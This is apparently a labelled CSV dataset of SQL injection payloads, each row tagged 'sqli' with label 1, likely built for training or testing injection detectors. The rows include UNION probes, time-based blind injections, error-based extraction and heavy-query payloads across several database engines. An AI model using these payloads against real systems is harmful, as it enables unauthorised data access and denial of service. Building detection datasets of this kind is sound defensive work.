payload,attack_type,label
"1%')))orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)and((('%'='",sqli,1
"1'inbooleanmode)and8635=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
1')aspogxwhere4105=4105and2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(2853=2853)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)--,sqli,1
"-7041"")))unionallselect2159,2159,2159,2159,2159--",sqli,1
"-4679where9634=9634unionallselect9634,9634,9634,9634,9634,9634,9634--",sqli,1
"1"")unionallselectnull,null,null#",sqli,1
"-5115""unionallselect1642,1642,1642,1642,1642,1642,1642,1642--",sqli,1
"1))aspxmzwhere2596=2596;selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"-7306""or2081=6847",sqli,1
1%';select(casewhen(7271=1658)then7271else7271*(select7271frominformation_schema.character_sets)end)#,sqli,1
"1%"")and6510=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and(""%""=""",sqli,1
"1"")where6956=6956or8315=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"-9770'))asovhhwhere7903=7903or5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(5023=5023)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1
"-8599))orelt(5628=2324,2324)and((1134=1134",sqli,1
1));begindbms_lock.sleep(5);endand((2160=2160,sqli,1
"1""))andelt(4249=4249,7259)and((""xjdh""=""xjdh",sqli,1
"-1438where6759=6759unionallselect6759,6759#",sqli,1
"1%"")unionallselectnull,null,null,null#",sqli,1
"-4330'unionallselect3059,3059,3059,3059,3059,3059,3059,3059,3059--",sqli,1
"-2340%""orderby1#",sqli,1
1%')));if(7899=7899)select7899elsedropfunctionzbbp--,sqli,1
"1')and(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(3484=3484,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))and('ndhn'like'ndhn",sqli,1
"1'+(select'qvif'where1758=1758unionallselectnull,null,null,null,null,null,null,null#",sqli,1
-8504where3086=3086or1131=9188#,sqli,1
1;selectcasewhen7717=7717then1elsenullend--,sqli,1
1'+(select'luhy'where3112=3112and(3020=3020)*6703)+',sqli,1
"1%""orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))and""%""=""",sqli,1
"-4641"")where4212=4212ormake_set(3595=4062,4062)--",sqli,1
"1"")andelt(1889=7397,7397)and(""kuau""=""kuau",sqli,1
"1'||(select'adoe'fromdualwhere7662=7662;selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)||'",sqli,1
1')))and(select*from(select(sleep(5)))fzno)and((('acml'like'acml,sqli,1
"1"")aseibfwhere5026=5026and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,1
"1'orupdatexml(1808,concat(0x2e,0x7171706a71,(select(elt(1808=1808,1))),0x717a767a71),8666)and'nhmz'like'nhmz",sqli,1
1)asqywzwhere1864=1864and3715in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(3715=3715)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1
-2820'))or6679=8848--,sqli,1
1%')and2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(2853=2853)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)and('%'=',sqli,1
"1""where3368=3368and9254=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
-8777%')))or(3934=2025)*2025and((('%'=',sqli,1
"1))asrconwhere8190=8190or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"1')or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)",sqli,1
"1')askeomwhere7524=7524and2716=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"-6200'))asjjpzwhere4490=4490unionallselect4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",sqli,1
"1'))andelt(1210=1210,sleep(5))and(('jnmf'='jnmf",sqli,1
"1%'andchar(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)and'%'='",sqli,1
"1where5925=5925and8189=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"-1915%""))unionallselect7732,7732,7732,7732,7732,7732,7732,7732,7732#",sqli,1
"1'where8969=8969unionallselectnull,null,null,null,null--",sqli,1
"1'||(select'vwop'where8536=8536or5356=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"1and8407=(selectcount(*)fromgenerate_series(1,5000000))",sqli,1
-2214')unionallselect8228#,sqli,1
"1"";callregexp_substring(repeat(right(char(3702),0),500000000),null)",sqli,1
1')asjxtgwhere1071=1071andsleep(5)--,sqli,1
"1"");createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)and(""tlbp""=""tlbp",sqli,1
"1'orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))and'ibdj'='ibdj",sqli,1
"-5640""))or9792=2728--",sqli,1
"1)or8315=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)and(7338=7338",sqli,1
"1"")asvpnawhere5450=5450orchar(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
1%')));waitfordelay'0:0:5'--,sqli,1
"1'))askgfpwhere2366=2366;selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
1'));select(casewhen(4769=4769)then4769else4769*(select4769frommysql.db)end)#,sqli,1
"-9347')unionallselect3884,3884#",sqli,1
1%')));(select*from(select(sleep(5)))srmq)and((('%'=',sqli,1
"1'inbooleanmode)unionallselectnull,null,null,null,null,null,null,null,null#",sqli,1
"1'));selectdbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5)fromdual--",sqli,1
"1%""orsleep(5)and""%""=""",sqli,1
"1,(select(casewhen(2106=2106)then(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)else2106*(select2106frommaster..sysdatabases)end))",sqli,1
"1%""or7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1
"1""where4161=4161and8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1%""or4240=(select4240frompg_sleep(5))--",sqli,1
-7742)astgzqwhere7842=7842or2062=1563,sqli,1
"1%"")));select(casewhen(4666=4666)then1else4666*(select4666frommaster..sysdatabases)end)--",sqli,1
1orsleep(5)--nrzf,sqli,1
"1')asywtuwhere3009=3009or4915=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"-4044%""or4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4493=4493)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and""%""=""",sqli,1
1'))orsleep(5)and(('uzhd'like'uzhd,sqli,1
"1')orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)and('ywxc'='ywxc",sqli,1
"1"")));selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4--",sqli,1
"-9583%""))unionallselect9349,9349,9349,9349,9349,9349,9349--",sqli,1
"1')))and(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(3484=3484,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))and((('xpks'like'xpks",sqli,1
"1%"");select*fromgenerate_series(1488,1488,casewhen(1488=1685)then1else0end)limit1--",sqli,1
-3966')or7338=8657,sqli,1
"1""and3715in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(3715=3715)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and""vziz""=""vziz",sqli,1
"1""where5796=5796andsleep(5)#",sqli,1
-8248or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq'),sqli,1
"1"")aspgzawhere8756=8756or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
select'qqpjq'||(case5118when5118then1else0end)||'qzvzq'fromrdb$database,sqli,1
"1))asgobwwhere3496=3496unionallselectnull,null,null,null,null,null,null,null,null--",sqli,1
"-5560""))or7292=6184#",sqli,1
1'andsleep(5)#,sqli,1
"1"")))or(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(8113=8113,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))and(((""ldlp""=""ldlp",sqli,1
"1"")))(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0)))and(((""kfdh""like""kfdh",sqli,1
1))orsleep(5)and((8285=8285,sqli,1
"1""))asgqxkwhere9199=9199and3754=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(3754=3754)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)--",sqli,1
1%'and6240=('qqpjq'||(selectcase6240when6240then1else0endfromrdb$database)||'qzvzq')and'%'=',sqli,1
1')asxbscwhere6772=6772;waitfordelay'0:0:5'--,sqli,1
"1'and6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(6055=6055)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and'cgbf'like'cgbf",sqli,1
"1'orelt(6272=6272,sleep(5))and'vrim'='vrim",sqli,1
"1"")));selectcasewhen6229=2077then1elsenullend--",sqli,1
"1""where7599=7599;beginuser_lock.sleep(5);end--",sqli,1
"1where5332=5332or(select9173from(selectcount(*),concat(0x7171706a71,(select(elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)--",sqli,1
"1%')))orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))and((('%'='",sqli,1
"1%"")or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and(""%""=""",sqli,1
"-5313"")))unionallselect9189,9189,9189,9189,9189,9189,9189,9189--",sqli,1
"1and3707=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--xlfz",sqli,1
1;select(casewhen(6276=6276)then6276else6276*(select6276frominformation_schema.character_sets)end)#,sqli,1
"1"")))and8189=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"-1526"")where4870=4870unionallselect4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",sqli,1
"1""))orsleep(5)and((""mcyv""=""mcyv",sqli,1
"1%""))orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and((""%""=""",sqli,1
1'+(select'diet'where7004=7004rlikesleep(5))+',sqli,1
1');(select*from(select(sleep(5)))srmq)and('pags'='pags,sqli,1
"1"")where9621=9621;waitfordelay'0:0:5'--",sqli,1
"-3817"")asvugzwhere3064=3064or9323=9323#",sqli,1
"1"")))and6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(6055=6055)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and(((""fogb""like""fogb",sqli,1
1)where9649=9649and8594=(select8594frompg_sleep(5))--,sqli,1
1');beginuser_lock.sleep(5);end--,sqli,1
"1%""and(3020=3020)*6703and""%""=""",sqli,1
"1%""))or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))and((""%""=""",sqli,1
"1'))unionallselectnull,null,null,null,null,null--",sqli,1
"-2305'inbooleanmode)unionallselect8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",sqli,1
"1%"")))orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(((""%""=""",sqli,1
"1%')))or(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(8113=8113,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))and((('%'='",sqli,1
-9145')or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')and('yvfl'like'yvfl,sqli,1
"-4721')orelt(4378=5165,5165)and('fufn'='fufn",sqli,1
1'+(selectxzsewhere4530=4530;(select*from(select(sleep(5)))srmq))+',sqli,1
-6203')))or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and((('luee'='luee,sqli,1
"1%');callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and('%'='",sqli,1
1')))and(8982=8027)*8027and((('qkrv'='qkrv,sqli,1
"1%')and4241=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(4241=4241)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and('%'='",sqli,1
"1'))orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(('acly'like'acly",sqli,1
"-4606"")aselekwhere8261=8261or8571=8571--",sqli,1
"1"")ashblkwhere7982=7982and9611=6142--",sqli,1
"1%'unionallselectnull,null,null,null,null,null,null,null#",sqli,1
"-5204"")unionallselect7186,7186,7186--",sqli,1
"1)where1622=1622;selectbenchmark(5000000,md5(0x4c4d6142))--",sqli,1
"1""where8379=8379and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1%"")));(select*from(select(sleep(5)))srmq)and(((""%""=""",sqli,1
1%'))waitfordelay'0:0:5'and(('%'=',sqli,1
"1%'))unionallselectnull,null--",sqli,1
"1and8514=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--loao",sqli,1
1'inbooleanmode);select(casewhen(4660=4660)then4660elsecast(1asint)/(select0fromdual)end)fromdual--,sqli,1
"1));selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4--",sqli,1
1')asyqldwhere2489=2489;waitfordelay'0:0:5'--,sqli,1
"1')));selectbenchmark(5000000,md5(0x714e4153))#",sqli,1
"-5597')ormake_set(2490=2164,2164)",sqli,1
"-7119"")or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')and(""rmzm""=""rmzm",sqli,1
"1""and7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(7756=7756)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1
"1'||(select'jfxs'fromdualwhere5485=5485andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
"1%')or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))and('%'='",sqli,1
1)aswiyxwhere6515=6515;selectcasewhen7717=7717then1elsenullend--,sqli,1
"1%')andchar(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)and('%'='",sqli,1
"1"")where9680=9680and(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(3484=3484,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))--",sqli,1
"1%"");if(9953=4347)select9953elsedropfunctionocau--",sqli,1
-4965)asimgawhere3705=3705unionallselect3705--,sqli,1
"1)or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)and(8898=8898",sqli,1
"1'+(selectaahcwhere5436=5436and3824=benchmark(5000000,md5(0x76555642)))+'",sqli,1
"-8309'||(select'qecl'where8449=8449unionallselect8449,8449,8449,8449,8449,8449,8449--",sqli,1
"1%"");selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3and(""%""=""",sqli,1
(casewhen2646=8520then2646elsenullend),sqli,1
"1"")waitfordelay'0:0:5'and(""hhzy""like""hhzy",sqli,1
1')where4867=4867rlike(select(casewhen(7689=7689)then1else0x28end))--,sqli,1
"1""))asuxncwhere8041=8041and9198=9198--",sqli,1
"1')aswnyswhere6457=6457or8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1
"-4807'where3232=3232ormake_set(6599=5179,5179)--",sqli,1
"1'inbooleanmode)orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)#",sqli,1
"1%'));createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)--",sqli,1
"1"")))andmake_set(8403=8403,8899)and(((""uisi""=""uisi",sqli,1
1;selectpg_sleep(5)#pjvi,sqli,1
"1))asxutuwhere5811=5811orchar(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
(select(casewhen(3348=1710)then3348elsecast(1asint)/(select0fromdual)end)fromdual),sqli,1
"1'where4334=4334orelt(5873=5873,sleep(5))#",sqli,1
"1"")askbjtwhere2012=2012and(5978=6898)*6898--",sqli,1
"1'))asfwhvwhere3921=3921unionallselectnull,null--",sqli,1
"-7422""unionallselect9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",sqli,1
1))asiihkwhere5414=5414and7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(7756=7756)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1
"-5148""))or5310=8229",sqli,1
"1))and8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1))and8514=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and((5507=5507",sqli,1
"1%""andmake_set(8403=8403,8899)and""%""=""",sqli,1
1'inbooleanmode)rlikesleep(5)#,sqli,1
"1"";select(casewhen(4769=4769)then4769else4769*(select4769frommysql.db)end)#",sqli,1
1)asfxfewhere1148=1148or(select*from(select(sleep(5)))sddo)#,sqli,1
"1%')));iif(4638=8258,1,1/0)",sqli,1
"-5706""))unionallselect2013,2013,2013,2013#",sqli,1
"1')asohcswhere9588=9588orelt(6272=6272,sleep(5))--",sqli,1
-7903where6699=6699or8571=8571--,sqli,1
1'and2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(2853=2853)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)and'ukzb'='ukzb,sqli,1
"1""and6240=('qqpjq'||(selectcase6240when6240then1else0endfromrdb$database)||'qzvzq')",sqli,1
"1'||(select'fcws'fromdualwhere9184=9184andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161))||'",sqli,1
1'rlikesleep(5),sqli,1
"-1710""))ascvkywhere1858=1858unionallselect1858,1858--",sqli,1
-2174'))or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')and(('dyyg'='dyyg,sqli,1
"-4550"")ashlwewhere6026=6026or(9364=9593)*9593--",sqli,1
1'||(select'xmoq'fromdualwhere8047=8047and7533=7533)||',sqli,1
1%'and6454=8348and'%'=',sqli,1
1)rlike(select(casewhen(5477=7492)then1else0x28end))and(4427=4427,sqli,1
"1""and4595=4595#",sqli,1
1)asqkkmwhere8461=8461;select(casewhen(9030=9185)then9030else9030*(select9030frominformation_schema.character_sets)end)#,sqli,1
"1""))unionallselectnull#",sqli,1
"-7553%""or3571=2886",sqli,1
1)where4548=4548and9198=9198--,sqli,1
"1')orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))",sqli,1
"1)and8407=(selectcount(*)fromgenerate_series(1,5000000))and(2160=2160",sqli,1
"elt(2427=2427,5518)",sqli,1
"1%""))rlike(select(casewhen(4207=1757)then1else0x28end))and((""%""=""",sqli,1
"1'))asuncywhere8009=8009unionallselectnull,null,null,null,null,null,null,null,null#",sqli,1
"-9007)asgillwhere6462=6462unionallselect6462,6462,6462,6462,6462,6462,6462,6462,6462#",sqli,1
"1';select*fromgenerate_series(4465,4465,casewhen(4465=6232)then1else0end)limit1--",sqli,1
-4325orderby1--,sqli,1
1where1568=1568or(select*from(select(sleep(5)))sddo)#,sqli,1
"1""))asphiswhere4420=4420and3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
-2866'))or4491=9429#,sqli,1
"1')where7541=7541;createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)--",sqli,1
"1);selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"1%""))and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and((""%""=""",sqli,1
"1')asfxukwhere6184=6184andmake_set(9292=2785,2785)--",sqli,1
"-6076""))or8277=4757",sqli,1
"-4586unionallselect2068,2068,2068,2068--",sqli,1
1;beginuser_lock.sleep(5);end,sqli,1
"1where6500=6500;callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"-2717""or1groupbyconcat(0x7171706a71,(select(casewhen(4232=4232)then1else0end)),0x717a767a71,floor(rand(0)*2))havingmin(0)#",sqli,1
"1%""or8466=benchmark(5000000,md5(0x694a4745))and""%""=""",sqli,1
"1%"")))(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0)))and(((""%""=""",sqli,1
